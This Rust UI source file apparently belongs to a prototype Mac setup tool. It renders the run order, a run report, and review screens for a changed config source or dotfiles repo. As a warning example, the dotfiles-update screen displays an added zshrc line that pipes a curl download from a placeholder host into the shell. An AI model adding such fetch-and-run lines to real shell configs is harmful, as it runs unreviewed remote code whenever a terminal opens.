//! After the review: the first minute of a Run, the report, and what happens when a source or a Dotfiles Repo moves.

use rune::{El, col, row, text};
use rune_kit::{Button, ButtonVariant, Checkbox, Kit, TextInput};

use crate::plan::{list, plan, s};
use crate::ui::*;
use crate::{App, Screen};

#[derive(Clone, Copy, PartialEq)]
pub enum Moved {
    Stranger,
    Own,
    Rewritten,
}

fn stage(k: &Kit, name: &str, what: &str, emphasis: bool) -> El {
    row()
        .w_full()
        .gap(12.0)
        .items_start()
        .child(col().w(150.0).child(text(name.to_string()).font(k.ty.text_xsmall_medium).color(if emphasis { k.c.warning.fg } else { k.c.text_muted })))
        .child(col().grow(1.0).min_w(0.0).child(para(k, what)))
}

pub fn first_minute(app: &App, k: &Kit) -> El {
    let p = plan(&app.plan);
    let tap_on = app.boxes.taps.values().any(|v| *v);
    let mut order = col().w_full().gap(8.0)
        .child(stage(k, "Now", "Your password and GitHub sign-in, then you can walk away.", false))
        .child(stage(k, "Admin Stage", "Command Line Tools and Homebrew. Your password is held in memory only.", false))
        .child(stage(k, "Password discarded", "Before any code outside the Catalog and official Homebrew runs.", false))
        .child(stage(k, "User Stage", "GitHub CLI, official Homebrew packages, Catalog downloads and settings.", false));
    if tap_on {
        let names: Vec<&String> = app.boxes.taps.iter().filter(|(_, v)| **v).map(|(t, _)| t).collect();
        order = order.child(stage(k, "What you approved", &format!("Code from {} runs here, with no password available.", names.iter().map(|n| n.as_str()).collect::<Vec<_>>().join(", ")), true));
    }
    let d = &p["dotfiles"];
    if app.boxes.repo && !d.is_null() {
        order = order.child(stage(k, "What you approved", &format!("Files from {} at commit {} replace yours. No password is available.", s(d, "repo"), d["commit"].as_str().unwrap_or("")), true));
    }
    if app.boxes.script && !d.is_null() {
        if let Some(script) = d["script"].as_str() {
            order = order.child(stage(k, "What you approved", &format!("{script} runs once, after those links, still with no password."), true));
        }
    }
    let body = col()
        .w_full()
        .gap(14.0)
        .child(section(k, "What happens, in order", "", card(k, order)))
        .child(section(k, "Your Mac password", "Needed because this Mac has admin work. Soulcaster checks it once, and it's never written to disk.", card(k, col().w_full().gap(8.0)
            .child(TextInput::new(&app.paste).placeholder("Mac password").disabled(true).build(k))
            .child(muted(k, "PROTOTYPE: this box does nothing.")))))
        .child(section(k, "GitHub sign-in", "Opens your browser. You'll enter this code there.", card(k, data(k, "WDJB-MJHT"))))
        .child(muted(k, format!("{} Approvals are saved on this Mac only when this Run starts.", crate::review::sentence(app, p))));
    let foot = row().w_full().gap(8.0).child(Button::new("Back to review").variant(ButtonVariant::Ghost).on_press(|a: &mut App| a.screen = Screen::Review).build(k));
    page(k, "Two questions, then you can walk away", "Import / Run", body, Some(foot))
}

pub fn report(app: &App, k: &Kit) -> El {
    let p = plan(&app.plan);
    let mut left = col().w_full().gap(8.0);
    for t in list(p, "taps") {
        left = left.child(row().w_full().gap(12.0).center_y()
            .child(col().grow(1.0).min_w(0.0).gap(2.0)
                .child(data(k, list(t, "packages").iter().map(|x| s(x, "name")).collect::<Vec<_>>().join(", ")))
                .child(muted(k, "You didn't approve its tap. This isn't Drift, it isn't in your queue, and nothing will nag you about it.")))
            .child(Button::new("Review again").on_press(|a: &mut App| { let id = a.plan.clone(); a.open_review(&id) }).build(k)));
    }
    let body = col()
        .w_full()
        .gap(14.0)
        .child(card(k, para(k, "12 installed, 2 settings set. Your password was discarded before the User Stage.")))
        .child(section(k, "Left out because you didn't approve it", "", card(k, left)))
        .child(section(k, "Needs-You Queue", "Only what a person has to finish.", card(k, para(k, "Android SDK: read and accept the Android SDK licenses."))))
        .child(section(k, "Won't apply", "", card(k, muted(k, "5 entries, as the review showed. They stay in your copy."))));
    page(k, "Run finished", "Report", body, None)
}

fn change(k: &Kit, mark: &str, what: &str, why: &str) -> El {
    row()
        .w_full()
        .gap(12.0)
        .items_start()
        .child(col().w(70.0).child(colored(k, mark, k.c.text_muted)))
        .child(col().w(300.0).child(data(k, what)))
        .child(col().grow(1.0).min_w(0.0).child(muted(k, why)))
}

pub fn update_config(app: &App, k: &Kit) -> El {
    let tap = col().w_full().gap(8.0)
        .child(Checkbox::new(app.update_tap)
            .label("Install flashlight from mobile-dev-inc/tap")
            .on_toggle(|a: &mut App| a.update_tap = !a.update_tap)
            .build(k).key("update-tap"))
        .child(para(k, "You approved maestro from this tap. That doesn't cover a new package from it, so this starts off, with the same stakes as before."));
    let repo = col().w_full().gap(8.0)
        .child(Checkbox::new(app.update_repo)
            .label("Link 1 file from example-dev/dotfiles at commit 5e6f7a8")
            .on_toggle(|a: &mut App| a.update_repo = !a.update_repo)
            .build(k).key("update-repo"))
        .child(data(k, "~/.zshrc  ←  zshrc"))
        .child(colored(k, "Runs whenever a terminal opens", k.c.warning.fg))
        .child(para(k, "This Config had no Dotfiles Repo before. It doesn't belong to your GitHub account, and it starts off. The full wording is the same as on the first review."));
    let safe = col().w_full().gap(8.0)
        .child(change(k, "Changed", "dock.autohide  On → Off", "Your Mac is On now. It changes at your next Run."))
        .child(change(k, "Added", "ripgrep", "From official Homebrew. It installs at your next Run."))
        .child(change(k, "Removed", "kotlin", "Nothing is uninstalled. It becomes \"no longer in this Config\", and you choose then."))
        .child(change(k, "Yours", "dock.position  left", "You changed this in your copy, so your value stays."));
    let body = col()
        .w_full()
        .gap(16.0)
        .child(card(k, col().w_full().gap(6.0)
            .child(kv(k, "Your copy", data(k, "configs/mobile.json from example-dev/mac-setup at 3f9a1c2")))
            .child(kv(k, "Source now", data(k, "9c8d7e6, 2 commits later")))
            .child(muted(k, "Your copy doesn't change unless you choose, and nothing on this Mac has changed. Soulcaster checks only when you open this Config."))))
        .child(section(k, "New code that could run", "Each one stays off unless you turn it on.", col().w_full().gap(10.0).child(risky(k, tap, app.update_tap)).child(risky(k, repo, app.update_repo))))
        .child(section(k, "Other changes", "These need no approval, and none of them applies until your next Run's review.", card(k, safe)));
    let foot = row().w_full().gap(8.0).center_y()
        .child(Button::new("Stay on my copy").variant(ButtonVariant::Ghost).on_press(|a: &mut App| a.screen = Screen::Paste).build(k))
        .child(rune::spacer())
        .child(Button::new("Update my copy").variant(ButtonVariant::Contrast).on_press(|a: &mut App| a.screen = Screen::Paste).build(k));
    page(k, "The source of this Config has changed", "Your Config", body, Some(foot))
}

pub fn update_dotfiles(app: &App, k: &Kit, m: Moved) -> El {
    let (repo, from, to) = match m {
        Moved::Own => ("example-you/dotfiles", "77aa012", "88bb123"),
        _ => ("example-stranger/dotfiles", "a1b2c3d", "e4f5a6b"),
    };
    let title = match m {
        Moved::Rewritten => format!("{repo}'s history was rewritten"),
        _ => format!("{repo} has moved past what you approved"),
    };
    let summary = col().w_full().gap(6.0)
        .child(kv(k, "This Mac", data(k, format!("{from}, the commit you approved"))))
        .child(kv(k, "Repo now", data(k, match m {
            Moved::Rewritten => format!("{to}. Commit {from} is no longer in its history."),
            Moved::Own => format!("{to}, 1 commit later"),
            Moved::Stranger => format!("{to}, 4 commits later"),
        })))
        .child(muted(k, format!("This Mac stays at {from} until you choose, and every Run keeps using it. Soulcaster never pulls on its own.")));
    let mut c = col().w_full().gap(16.0).child(card(k, summary));
    if m == Moved::Rewritten {
        c = c.child(card(k, para(k, "Someone replaced the history, so Soulcaster can't show what changed since you approved it. Treat this as a repo you've never seen: read it on GitHub first. It starts off whoever owns it.")));
    } else {
        let mut files = col().w_full().gap(4.0)
            .child(strong(k, "zsh/zshrc, linked at ~/.zshrc"))
            .child(colored(k, "Runs whenever a terminal opens", k.c.warning.fg))
            .child(data(k, "  export EDITOR=nvim"))
            .child(data(k, "+ source <(curl -fsSL https://example.invalid/init.sh)"));
        if m == Moved::Stranger {
            files = files.child(strong(k, "script/setup, your approved install script")).child(data(k, "+ ./script/lib/telemetry.sh"));
        }
        c = c.child(section(k, "Changes this Mac would use", "Written by the repo's author, and shown as text only.", card(k, files)));
        if m == Moved::Stranger {
            c = c.child(muted(k, "7 other files changed. They aren't linked, but a linked file or the script may still run them. See them all on GitHub."));
        }
    }
    let script = if m == Moved::Own { "install.sh" } else { "script/setup" };
    let checkbox_note = match m {
        Moved::Own => "This repo belongs to your GitHub account, so this starts on. Nothing moves until you press the button.",
        _ => "It starts off. Leave it and this Mac stays where it is.",
    };
    let approve = col().w_full().gap(8.0)
        .child(Checkbox::new(app.move_commit)
            .label(format!("Move to commit {to}"))
            .on_toggle(|a: &mut App| { a.move_commit = !a.move_commit; if !a.move_commit { a.move_script = false } })
            .build(k).key("move-commit"))
        .child(para(k, checkbox_note))
        .child(Checkbox::new(app.move_script)
            .label(format!("Also run {script} once, at commit {to}"))
            .disabled(!app.move_commit)
            .on_toggle(|a: &mut App| a.move_script = !a.move_script)
            .build(k).key("move-script"))
        .child(muted(k, format!("Approving {script} at {from} doesn't cover {to}. This stays off whoever owns the repo.")));
    c = c.child(risky(k, approve, app.move_commit));
    let foot = row().w_full().gap(8.0).center_y()
        .child(Button::new(format!("Stay at {from}")).variant(ButtonVariant::Ghost).on_press(|a: &mut App| a.screen = Screen::Paste).build(k))
        .child(rune::spacer())
        .child(Button::new(if app.move_commit { format!("Move to {to}") } else { "Choose a commit to move".into() }).variant(ButtonVariant::Contrast).disabled(!app.move_commit).on_press(|a: &mut App| a.screen = Screen::Paste).build(k));
    page(k, &title, "Dotfiles Repo", c, Some(foot))
}

pub fn save(k: &Kit) -> El {
    let body = col()
        .w_full()
        .gap(14.0)
        .child(card(k, col().w_full().gap(8.0)
            .child(kv(k, "Your copy", para(k, "Saved on this Mac. It's yours to change, and it doesn't follow its source.")))
            .child(kv(k, "Save to", data(k, "example-you/configs  configs/mobile.json  (new file)")))
            .child(kv(k, "Name", data(k, "\"Mobile dev laptop\"")))))
        .child(section(k, "Approvals don't travel", "They're kept on this Mac, never in a Config, and saving a copy doesn't change that.", card(k, col().w_full().gap(4.0)
            .child(para(k, "On another Mac, mobile-dev-inc/tap starts off again."))
            .child(para(k, "A stranger's Dotfiles Repo stays a stranger's, even in your own Config Repo."))
            .child(muted(k, "Entries Soulcaster can't save, such as anything that looks like a secret, stop the save and are listed here to remove first.")))))
        .child(section(k, "What will be committed", "Your source stays on this Mac, so the file doesn't say where it came from.", card(k, data(k, "+ configs/mobile.json  (34 lines)"))));
    let foot = row().w_full().gap(8.0).center_y()
        .child(Button::new("Not now").variant(ButtonVariant::Ghost).on_press(|a: &mut App| a.screen = Screen::Paste).build(k))
        .child(rune::spacer())
        .child(Button::new("Save to example-you/configs").variant(ButtonVariant::Contrast).on_press(|a: &mut App| a.screen = Screen::Paste).build(k));
    page(k, "Save your copy to your Config Repo", "Import", body, Some(foot))
}
